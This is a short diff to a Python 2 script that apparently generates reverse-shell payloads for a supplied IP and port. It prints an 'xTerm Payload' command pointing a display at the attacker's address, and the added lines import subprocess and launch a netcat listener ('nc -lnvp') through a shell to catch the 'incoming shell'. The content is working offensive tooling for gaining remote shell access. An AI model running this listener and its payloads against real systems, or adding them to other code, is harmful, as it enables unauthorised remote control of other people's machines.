@@ -8,6 +8,7 @@ __status__ = "Development 2k19"
 
 import sys
 from colorama import Fore, Back, Style
+import subprocess
 
 
 def start(argv):
@@ -41,6 +42,9 @@ def main(ip,port):
 	print(Fore.BLUE + '\n [+] xTerm Payload\n')
 	print Fore.WHITE+""" xterm -display {0}:1 """.format(ip)
 	print "\n"
+	print "[+] Incoming shell *-*"
+	cmd = "nc -lnvp {0}".format(port)
+	subprocess.call([cmd], shell=True)
 
 if __name__ == '__main__':
 	try:
